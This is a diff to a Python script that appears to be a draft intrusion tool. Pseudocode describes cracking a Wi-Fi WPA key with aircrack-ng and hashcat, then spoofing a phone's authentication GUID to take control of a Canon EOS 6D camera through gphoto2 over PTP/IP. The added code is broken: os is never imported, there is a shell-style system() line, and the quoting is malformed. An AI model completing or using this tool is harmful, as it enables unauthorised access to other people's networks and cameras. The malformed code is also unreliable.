@@ -1,10 +1,18 @@
 #!/usr/bin/python3
 
+# import dependencies
+import subprocess
+
 # file imports
 import guidTools, getAuthInfo
 
-# initialize variables
+## initialize variables
 phoneIP = "10.0.0.100"
+cameraIP = "10.0.0.2"
+# gphoto command
+gphoto2Cmd = "-L"
+# location of gphoto2 settings file
+gphoto2Settings = os.path.expanduser("~/Scripts/pictool/settings.conf")
 
 ############ PSUEDOCODE #################################
 # Obtain network access
@@ -23,7 +31,7 @@ while(aircrack exits with "no valid handshakes found, or no file or directory")
 aircrack-ng psk-01.cap -J output
 
 # take captured cap and format for hashcat 4
-cap2hccapx.bin /path/to/psk-01.cap /path/to/output.hccapx
+system(/path/to/cap2hccapx.bin /path/to/psk-01.cap /path/to/output.hccapx)
 
 # call hashcat remotely
     # output the found key
@@ -40,4 +48,11 @@ rawGUID = getAuthInfo(phoneIP)
 # set GUID in gphoto2 from phone
 setGUID(formatGUID(rawGUID))
 
-# connect to camera ip and run ptp stuff via gphoto2
+### connect to camera ip and run ptp stuff via gphoto2
+
+def runGphoto2(cameraIP,gphoto2Cmd):
+    # call the gphoto2 command and print output
+    subprocess.run(["gphoto2", "--port ptpip:{}".format(cameraIP), "--camera "Canon EOS 6D"", "{}".format(gphoto2Cmd)], stdout=subprocess.PIPE)
+
+# run the gphoto2 command
+runGphoto2(cameraIP,gphoto2Cmd)
